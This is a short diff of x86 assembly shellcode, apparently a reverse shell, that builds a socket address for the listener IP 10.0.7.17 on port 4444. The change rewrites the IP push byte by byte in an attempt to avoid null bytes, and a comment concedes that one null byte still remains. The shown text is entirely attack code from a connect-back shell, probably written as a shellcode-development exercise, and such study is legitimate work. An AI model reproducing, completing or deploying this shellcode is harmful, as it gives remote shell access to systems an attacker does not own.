@@ -132,9 +132,17 @@ xchg eax, esi    ; esi now contains our socketid
 
 ; we need to create the first stack pointer for sockaddr_in
 
-; still need to address nulls that are in my IP ... :/
+; PROBLY GOT NULL CHARS IN HERE ...
 xor edx, edx
-push dword 0x1107000a ; moving IP (10.0.7.17) [0x0a000711] but backwards is 0x1107000a into edx
+;push dword 0x1107000a ; moving IP (10.0.7.17) [0x0a000711] but backwards is 0x1107000a into edx
+
+push edx
+
+mov byte [esp]  , 0x0a
+mov byte [esp+1], 0x00 ;this is null
+mov byte [esp+2], 0x07
+mov byte [esp+3], 0x11
+
 push word  0x5C11     ; port number (least significant byte first ... 0x115C is 4444)
 push word  0x02       ; AF_INET - which is 0x02
 
